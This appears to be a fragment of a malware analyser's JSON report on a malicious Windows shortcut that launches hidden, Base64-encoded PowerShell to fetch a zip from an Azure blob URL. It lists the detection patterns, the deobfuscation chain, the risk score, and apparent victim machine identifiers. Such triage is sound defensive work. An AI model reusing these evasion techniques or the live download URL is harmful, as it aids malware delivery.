+    "icon_index": 2,
+    "icon_masquerade": true,
+    "remote_icon": false,
+    "double_extension": "",
+    "traversal_depth": 4,
+    "matched_patterns": [
+      "Base64-encoded PowerShell command",
+      "Hidden window style",
+      "ExecutionPolicy bypass"
+    ],
+    "urls": [
+      "https://11032026sver.blob.core.windows.net/homeplus/procespro.zip",
+      "11032026sver.blob.core.windows.net"
+    ],
+    "suspicious_hosts": [
+      "blob.core.windows.net"
+    ],
+    "deobfuscated_iocs": [
+      "https://11032026sver.blob.core.windows.net/homeplus/procespro.zip",
+      "11032026sver.blob.core.windows.net"
+    ],
+    "deobfuscation_chains": [
+      "base64 \u2192 base64 \u2192 reverse \u2192 de-double"
+    ],
+    "arg_padding": {
+      "length": 3196,
+      "max_run": 2,
+      "whitespace_ratio": 0.026595744680851064,
+      "exotic_chars": [],
+      "visible_whitespace_ratio": 0.03461538461538462,
+      "content_beyond_visible": true,
+      "zdi_can_25373": false,
+      "tier": "none"
+    },
+    "path_padding": {
+      "length": 66,
+      "max_run": 0,
+      "whitespace_ratio": 0.0,
+      "exotic_chars": [],
+      "visible_whitespace_ratio": 0.0,
+      "content_beyond_visible": false,
+      "zdi_can_25373": false,
+      "tier": "none"
+    },
+    "link_flags": [
+      "HasLinkTargetIDList",
+      "HasLinkInfo",
+      "HasName",
+      "HasRelativePath",
+      "HasWorkingDir",
+      "HasArguments",
+      "HasIconLocation",
+      "IsUnicode",
+      "HasExpIcon"
+    ],
+    "file_attributes": [
+      "ARCHIVE"
+    ],
+    "show_command": "SW_SHOWMINNOACTIVE",
+    "hotkey": 0,
+    "target_file_size": 423424,
+    "creation_time": "2026-05-06T00:37:55.425400+00:00",
+    "access_time": "2026-06-11T18:56:01.055906+00:00",
+    "write_time": "2026-05-06T00:37:55.425400+00:00",
+    "extra_blocks": [
+      "IconEnvironmentDataBlock",
+      "SpecialFolderDataBlock",
+      "KnownFolderDataBlock",
+      "TrackerDataBlock",
+      "PropertyStoreDataBlock"
+    ],
+    "env_target": "",
+    "icon_env_target": "%SystemRoot%\\System32\\imageres.dll",
+    "darwin_id": "",
+    "shim_layer": "",
+    "known_folder_id": "1ac14e77-02e7-4e5d-b744-2eb1ae5198b7",
+    "special_folder_id": 37,
+    "local_base_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "net_name": "",
+    "drive_serial": "B62FA171",
+    "volume_label": "Acer",
+    "machine_id": "laptop-pp7fvpth",
+    "mac_address": "c0:a5:e8:a3:0c:2c",
+    "mac_vendor": null,
+    "droid_volume_guid": "d4b31574-6c29-4d68-b8c0-80973a69a4e3",
+    "droid_file_guid": "7b7e9082-6340-11f1-877c-c0a5e8a30c2c",
+    "droid_birth_differs": false,
+    "shell_items": [
+      {
+        "class_type": 31,
+        "type_name": "root folder",
+        "name": "{20d04fe0-3aea-1069-a2d8-08002b30309d}",
+        "long_name": "",
+        "size": null,
+        "is_directory": false,
+        "guid": "20d04fe0-3aea-1069-a2d8-08002b30309d",
+        "modified": null,
+        "created": null,
+        "accessed": null,
+        "mft_entry": null,
+        "mft_sequence": null,
+        "extension_signatures": [],
+        "truncated": false
+      },
+      {
+        "class_type": 47,
+        "type_name": "volume",
+        "name": "C:\\",
+        "long_name": "",
+        "size": null,
+        "is_directory": false,
+        "guid": null,
+        "modified": null,
+        "created": null,
+        "accessed": null,
+        "mft_entry": null,
+        "mft_sequence": null,
+        "extension_signatures": [],
+        "truncated": false
+      },
+      {
+        "class_type": 49,
+        "type_name": "file entry",
+        "name": "Windows",
+        "long_name": "Windows",
+        "size": 0,
+        "is_directory": true,
+        "guid": null,
+        "modified": "2026-06-10T20:30:02",
+        "created": "2024-04-01T07:21:18",
+        "accessed": "2026-06-12T14:55:26",
+        "mft_entry": 795758,
+        "mft_sequence": 14,
+        "extension_signatures": [
+          "0xBEEF0004"
+        ],
+        "truncated": false
+      },
+      {
+        "class_type": 49,
+        "type_name": "file entry",
+        "name": "System32",
+        "long_name": "System32",
+        "size": 0,
+        "is_directory": true,
+        "guid": null,
+        "modified": "2026-06-10T20:36:42",
+        "created": "2024-04-01T07:21:18",
+        "accessed": "2026-06-12T14:52:26",
+        "mft_entry": 799129,
+        "mft_sequence": 14,
+        "extension_signatures": [
+          "0xBEEF0004"
+        ],
+        "truncated": false
+      },
+      {
+        "class_type": 49,
+        "type_name": "file entry",
+        "name": "WindowsPowerShell",
+        "long_name": "WindowsPowerShell",
+        "size": 0,
+        "is_directory": true,
+        "guid": null,
+        "modified": "2024-04-01T07:26:08",
+        "created": "2024-04-01T07:26:08",
+        "accessed": "2026-06-11T18:55:46",
+        "mft_entry": 806333,
+        "mft_sequence": 16,
+        "extension_signatures": [
+          "0xBEEF0004"
+        ],
+        "truncated": false
+      },
+      {
+        "class_type": 49,
+        "type_name": "file entry",
+        "name": "v1.0",
+        "long_name": "v1.0",
+        "size": 0,
+        "is_directory": true,
+        "guid": null,
+        "modified": "2026-05-06T00:39:36",
+        "created": "2024-04-01T07:26:08",
+        "accessed": "2026-06-11T18:55:46",
+        "mft_entry": 806334,
+        "mft_sequence": 15,
+        "extension_signatures": [
+          "0xBEEF0004"
+        ],
+        "truncated": false
+      },
+      {
+        "class_type": 50,
+        "type_name": "file entry",
+        "name": "powershell.exe",
+        "long_name": "powershell.exe",
+        "size": 423424,
+        "is_directory": false,
+        "guid": null,
+        "modified": "2026-05-06T00:37:56",
+        "created": "2026-05-06T00:37:56",
+        "accessed": "2026-06-11T18:55:46",
+        "mft_entry": 1089582,
+        "mft_sequence": 2,
+        "extension_signatures": [
+          "0xBEEF0004"
+        ],
+        "truncated": false
+      }
+    ],
+    "shell_item_count": 7,
+    "property_store": [
+      {
+        "format_id": "46588ae2-4cbc-4338-bbfc-139326986dce",
+        "property_id": 4,
+        "name": "{46588ae2-4cbc-4338-bbfc-139326986dce}/4",
+        "value": "S-1-5-21-4018316176-2930928383-3956032897-1003"
+      },
+      {
+        "format_id": "446d16b1-8dad-4870-a748-402ea43d788c",
+        "property_id": 104,
+        "name": "{446d16b1-8dad-4870-a748-402ea43d788c}/104",
+        "value": "f8b8edc4-61a1-4e7e-ad84-0a0d2007a978"
+      }
+    ],
+    "file_size": 8497,
+    "entropy": 3.493,
+    "parsed_end": 8497,
+    "overlay": null,
+    "embedded_executables": []
+  },
+  "score_delta": 60,
+  "reason": "LOLBin target launching a Base64-encoded PowerShell command (+35); LOLBin target 
+fetching a remote URL (+28); Document icon in front of a LOLBin target (MITRE T1027.012) (+25); 
+Command line references known malware-hosting infrastructure (+22); LOLBin target launched with a 
+hidden window (+18); LOLBin target with execution-policy or profile bypass flags (+16); Argument 
+string far longer than any legitimate shortcut carries (+15); Obfuscated command line (+13); More 
+than four command-line arguments (+6); Target is a living-off-the-land binary (+5)"
+}
+
+Analysis complete  2026-01-01 00:00:00 UTC
+
